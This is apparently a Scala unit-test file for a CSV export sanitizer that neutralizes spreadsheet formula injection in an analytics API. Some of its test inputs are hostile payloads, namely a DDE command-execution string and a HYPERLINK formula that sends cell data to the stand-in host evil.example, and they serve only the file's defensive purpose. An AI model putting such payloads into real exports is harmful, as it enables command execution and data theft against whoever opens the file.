package com.otterworks.analytics.api

import com.otterworks.analytics.model.MarginRow
import org.scalatest.flatspec.AnyFlatSpec
import org.scalatest.matchers.should.Matchers

class CsvCellSpec extends AnyFlatSpec with Matchers:

  "CsvCell.text" should "prefix every formula trigger with a single quote" in {
    CsvCell.text("=cmd|'/c calc'!A0") shouldBe "'=cmd|'/c calc'!A0"
    CsvCell.text("+1+1") shouldBe "'+1+1"
    CsvCell.text("-2+3") shouldBe "'-2+3"
    CsvCell.text("@SUM(A1:A2)") shouldBe "'@SUM(A1:A2)"
    CsvCell.text("\t=1+1") shouldBe "'\t=1+1"
  }

  it should "neutralize formulas hidden behind leading whitespace" in {
    CsvCell.text("  =HYPERLINK(1)") shouldBe "'  =HYPERLINK(1)"
    CsvCell.text(" @SUM(A1)") shouldBe "' @SUM(A1)"
    CsvCell.text("\u00a0+1") shouldBe "'\u00a0+1"
    CsvCell.text("  plain") shouldBe "  plain"
  }

  it should "quote neutralized values that also need RFC 4180 escaping" in {
    CsvCell.text("=HYPERLINK(\"http://evil.example/?d=\"&A1,\"x\")") shouldBe
      "\"'=HYPERLINK(\"\"http://evil.example/?d=\"\"&A1,\"\"x\"\")\""
    CsvCell.text("\r=1") shouldBe "\"'\r=1\""
    CsvCell.text("\n=1") shouldBe "\"'\n=1\""
  }

  it should "leave ordinary values unchanged" in {
    CsvCell.text("document.created") shouldBe "document.created"
    CsvCell.text("user-1") shouldBe "user-1"
    CsvCell.text("2026-10-23T21:47:00Z") shouldBe "2026-10-23T21:47:00Z"
    CsvCell.text("") shouldBe ""
    CsvCell.text("a=b") shouldBe "a=b"
  }

  it should "keep RFC 4180 quoting for commas, quotes and newlines" in {
    CsvCell.text("a,b") shouldBe "\"a,b\""
    CsvCell.text("say \"hi\"") shouldBe "\"say \"\"hi\"\"\""
    CsvCell.text("line1\nline2") shouldBe "\"line1\nline2\""
  }

  "CsvCell.number" should "not prefix negative numbers" in {
    CsvCell.number(BigDecimal("-12.5")) shouldBe "-12.5"
    CsvCell.number(BigDecimal("42.00")) shouldBe "42.00"
  }

  "MarginRoutes.buildCsvContent" should "neutralize text columns and keep numeric columns numeric" in {
    val row = MarginRow(
      sku = "=1+1",
      name = "@SUM(A1)",
      category = "+cmd",
      supplier = "-x",
      listPriceUsd = BigDecimal("10.00"),
      commodityCostUsd = BigDecimal("4.00"),
      freightCostUsd = BigDecimal("1.00"),
      overheadCostUsd = BigDecimal("1.00"),
      cogsUsd = BigDecimal("12.00"),
      marginPct = BigDecimal("-20.0")
    )
    val lines = MarginRoutes.buildCsvContent(List(row)).split("\n").toList
    lines.head shouldBe
      "sku,name,category,supplier,list_price_usd,commodity_cost_usd,freight_cost_usd,overhead_cost_usd,cogs_usd,margin_pct"
    lines(1) shouldBe "'=1+1,'@SUM(A1),'+cmd,'-x,10.00,4.00,1.00,1.00,12.00,-20.0"
  }
